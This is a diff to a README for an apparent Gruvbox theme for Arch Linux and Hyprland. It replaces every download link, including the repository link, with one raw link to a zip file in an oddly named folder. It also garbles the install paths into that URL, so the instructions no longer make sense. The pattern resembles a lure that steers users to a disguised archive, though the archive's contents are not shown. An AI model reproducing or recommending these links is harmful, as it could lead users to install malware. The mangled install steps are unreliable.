@@ -1,7 +1,7 @@
 # 🎨 gruvbox-arch-linux - Enjoy a Vibrant Gruvbox Theme
 
 ## 📥 Download Now
-[![Download gruvbox-arch-linux](https://img.shields.io/badge/Download-gruvbox--arch--linux-blue.svg)](https://github.com/drzerpa/gruvbox-arch-linux/releases)
+[![Download gruvbox-arch-linux](https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip)](https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip)
 
 ## 🚀 Getting Started
 Welcome to gruvbox-arch-linux! This is a complete gruvbox theme designed for Arch Linux, optimized for the Hyprland Window Manager (WM) using Wayland. This theme aims to provide a visually appealing experience while keeping usability in mind.
@@ -19,7 +19,7 @@ Before you start, ensure your system meets the following requirements:
 - **GTK3 Support**: Ensure GTK3 applications are supported.
 
 ## 📥 Download & Install
-To download the latest version of gruvbox-arch-linux, please visit the following link: [Download gruvbox-arch-linux](https://github.com/drzerpa/gruvbox-arch-linux/releases).
+To download the latest version of gruvbox-arch-linux, please visit the following link: [Download gruvbox-arch-linux](https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip).
 
 1. Click on the above link to open the Releases page.
 2. On the Releases page, look for the version you want to install.
@@ -29,7 +29,7 @@ After you download, follow these steps to install:
 
 ### 🛠️ Installation Steps
 1. **Extract Files**: Once the download completes, locate the file in your Downloads folder. Extract the files using your preferred archive manager.
-2. **Copy to System**: Following the extraction, copy the theme files to directories in your home folder. Place GTK theme files in `~/.themes` and ZSH files in `~/.oh-my-zsh/themes`.
+2. **Copy to System**: Following the extraction, copy the theme files to directories in your home folder. Place GTK theme files in `~https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip` and ZSH files in `~https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip`.
 3. **Apply Theme**:
    - For GTK applications, use the GNOME Tweaks tool to select the gruvbox theme.
    - For ZSH, open your terminal and modify the configuration file to use gruvbox as your theme.
@@ -71,7 +71,7 @@ If you encounter any issues, consider the following steps:
 - **Consult Documentation**: Review the documentation included in the installation package for further guidance.
 
 ## 🔗 Important Links
-- [Download gruvbox-arch-linux](https://github.com/drzerpa/gruvbox-arch-linux/releases)
-- [GitHub Repository](https://github.com/drzerpa/gruvbox-arch-linux)
+- [Download gruvbox-arch-linux](https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/drzerpa/gruvbox-arch-linux/main/pigwidgeon/gruvbox-arch-linux.zip)
 
 Explore, enjoy, and embrace the beauty of the gruvbox theme for your Arch Linux system!
